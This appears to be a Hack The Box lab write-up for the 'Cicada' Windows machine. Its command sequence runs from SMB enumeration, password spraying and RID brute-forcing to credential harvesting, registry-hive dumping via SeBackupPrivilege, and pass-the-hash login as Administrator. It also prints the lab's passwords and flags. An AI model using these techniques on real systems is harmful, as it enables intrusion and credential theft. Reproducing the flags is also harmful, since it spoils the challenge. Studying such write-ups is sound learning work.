
HTB : [[Machines]]

**IP:** 10.10.11.35  
**Date:** 08/01/2025

---

### **Enumeration**

#### **Nmap Scan Results**

- **OS:** Windows Server 2022
- **Open Ports:**
    - LDAP
    - Kerberos

#### **Nessus Scan Results**

- SMB service detected.

---

### **SMB Enumeration**

#### **Accessing SMB Shares**

- Discovered `HR` share accessible without a password.
- Found a notice with a default password:
    
    ```
    Welcome to Cicada Corp! We're thrilled to have you join our team.
    As part of our security protocols, it's essential that you change your default password to something unique and secure.
    
    Your default password is: Cicada$M6Corpb*@Lp#nZp!8
    ```
    

---

### **Initial Access Attempt**

#### **Testing SMB**

- Tested access using `netexec`:
    
    ```bash
    netexec smb 10.10.11.35
    ```
    

#### **Bruteforcing Usernames with Default Password**

- Attempted to brute-force common usernames with the found password:
    
    ```bash
    netexec smb 10.10.11.35 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
    ```
    
- Only guest access was obtained.

#### **RID Brute-forcing**

Used RID brute-forcing to enumerate valid users:

```bash
netexec smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute
```

**Results:**

```plaintext
CICADA\Administrator (SidTypeUser)  
CICADA\Guest (SidTypeUser)  
CICADA\john.smoulder (SidTypeUser)  
CICADA\sarah.dantelia (SidTypeUser)  
CICADA\michael.wrightson (SidTypeUser)  
CICADA\david.orelious (SidTypeUser)  
CICADA\emily.oscars (SidTypeUser)  
```

---

### **Exploitation**

#### **Bruteforcing Valid Users**

- Stored the usernames in a `users.txt` file:
    
    ```plaintext
    Administrator  
    Guest  
    john.smoulder  
    sarah.dantelia  
    michael.wrightson  
    david.orelious  
    emily.oscars  
    ```
    
- Used the default password to brute-force the valid users:
    
    ```bash
    netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
    ```
    

**Result:**  
`michael.wrightson` did not change his password.

#### **Enumerating Additional Users**

- Using `michael.wrightson`'s credentials:
    
    ```bash
    netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
    ```
    

**Result:**  
Discovered `david.orelious` and his password:

```plaintext
Password: aRt$Lp#7t*VQ!3
```

#### **Accessing SMB Shares**

Using `david.orelious`'s credentials to enumerate shares:

```bash
smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
```

- Found the `DEV` share containing a **Backup Script** with `emily.oscars`' credentials:
    
    ```plaintext
    $username = "emily.oscars"
    $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
    ```
    

#### **High-Privilege User: Emily Oscars**

- Checked `emily.oscars`' privileges:
    
    ```bash
    smbmap -H 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
    ```
    
- Verified access to `ADMIN$`.

---

### **Privilege Escalation**

#### **Gaining Reverse Shell**

Using `evil-winrm` to gain a reverse shell:

```bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

- **User Flag:**
    
    ```plaintext
    fd9eccbf79f5ca488f8f3bda29072e3a
    ```
    

#### **Checking Privileges**

Executed `whoami /priv`:

```plaintext
SeBackupPrivilege             Back up files and directories  Enabled  
SeRestorePrivilege            Restore files and directories  Enabled  
```

**Exploitation:**  
`SeBackupPrivilege` allows reading sensitive files.

---

### **Dumping SAM & SYSTEM Files**

#### **Steps:**

1. Navigate to the C drive and create a temporary folder:
    
    ```bash
    mkdir Temp
    ```
    
2. Save the SAM and SYSTEM files:
    
    ```bash
    reg save hklm\sam c:\Temp\sam
    reg save hklm\system c:\Temp\system
    ```
    
3. Download the files using `evil-winrm`:
    
    ```bash
    download sam
    download system
    ```
    

---

### **Extracting Hashes**

Used `pypykatz` to extract user hashes:

```bash
pypykatz registry --sam sam system
```

**Results:**

```plaintext
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

---

### **Root Access**

Used the NTLM hash to gain access as `Administrator`:

```bash
evil-winrm -i 10.10.11.35 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```

- **Root Flag:**
    
    ```plaintext
    d3d5f0aba09f6a5e7e52e9dfc57e3490
    ```
    

---

### **Summary:**

1. **Enumeration:** Discovered SMB shares and default credentials.
2. **Exploitation:** Used `netexec` and SMB enumeration to find valid credentials.
3. **Privilege Escalation:** Leveraged `SeBackupPrivilege` to dump sensitive files and extract hashes.
4. **Root Access:** Used NTLM hash to access the system as `Administrator`.
